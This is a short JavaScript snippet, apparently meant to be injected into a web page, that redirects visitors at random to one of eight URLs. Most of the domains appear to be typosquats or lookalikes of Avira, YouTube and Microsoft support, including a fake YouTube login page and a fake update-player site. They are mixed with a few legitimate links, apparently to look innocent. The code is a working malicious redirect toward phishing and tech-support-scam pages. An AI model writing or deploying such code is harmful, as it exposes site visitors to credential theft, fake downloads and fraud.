<script>
{
    const Links = [
        'https://www.youtube.com/watch?v=MoDeF3iAR04',
        'https://www.youtube.com/watch?v=ApHFmCTs4-8', 
        'https://www.youtube.com/watch?v=mBtkbPTajFE',
        'https://www.avira.com/it',                   
        'https://av1ra-security-support.com',       
        'https://you-tube-service.net/login',          
        'https://secure-update-player.com',           
        'https://microsofft-support.tech'             
    ];

    const randomIndex = Math.floor(Math.random() * Links.length);
    const selectedLink = Links[randomIndex];
    window.location.href = selectedLink;
}
</script>
